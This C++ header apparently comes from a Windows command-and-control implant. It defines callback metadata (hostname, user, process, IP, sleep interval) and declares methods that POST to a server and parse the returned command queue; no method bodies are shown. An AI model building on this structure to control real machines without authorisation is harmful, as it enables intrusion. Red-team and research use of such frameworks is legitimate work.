#ifndef CALLBACKS_H
#define CALLBACKS_H
#include <winhttp.h>
#include <string>
#include <vector>
#include "../lib/json.hpp"

typedef std::vector<std::map<std::string, std::vector<std::string>>> CMD_QUEUE;

class CallbackMetadata {
public:
    std::string id;
    std::string hostname;
    std::string user;
    std::string process;
    std::string ip;
    int sleep = 0;

    void retrieveMetadata();

    static CallbackMetadata from_json(const nlohmann::json& j) {
        CallbackMetadata metadata;
        if (j.contains("id")) metadata.id = j["id"].get<std::string>();
        if (j.contains("hostname")) metadata.hostname = j["hostname"].get<std::string>();
        if (j.contains("user")) metadata.user = j["user"].get<std::string>();
        if (j.contains("process")) metadata.process = j["process"].get<std::string>();
        if (j.contains("ip")) metadata.ip = j["ip"].get<std::string>();
        if (j.contains("sleep")) metadata.sleep = j["sleep"].get<int>();
        return metadata;
    }
};
inline void to_json(nlohmann::json& j, const CallbackMetadata& m) {
    j = nlohmann::json{
            {"id", m.id},
            {"hostname", m.hostname},
            {"user", m.user},
            {"process", m.process},
            {"ip", m.ip},
            {"sleep", m.sleep}
    };
}

class CallbackFull {
public:
    CallbackMetadata metadata;
    std::vector<std::string> data;
    CMD_QUEUE do_callback();

    CMD_QUEUE json_to_cmd_queue(const std::string &response_body);

    CMD_QUEUE parse_response_json(const std::string &response_body);

    bool make_post_request(const std::wstring &host, int port, const std::string &post_body, std::string &return_body);

    static CallbackFull from_json(const nlohmann::json& j) {
        CallbackFull full;
        if (j.contains("metadata")) full.metadata = CallbackMetadata::from_json(j["metadata"]);
        if (j.contains("data")) full.data = j["data"].get<std::vector<std::string>>();
        return full;
    }
};
inline void to_json(nlohmann::json& j, const CallbackFull& f) {
    j = nlohmann::json{
            {"metadata", f.metadata},
            {"data", f.data}
    };
}

#endif // CALLBACKS_H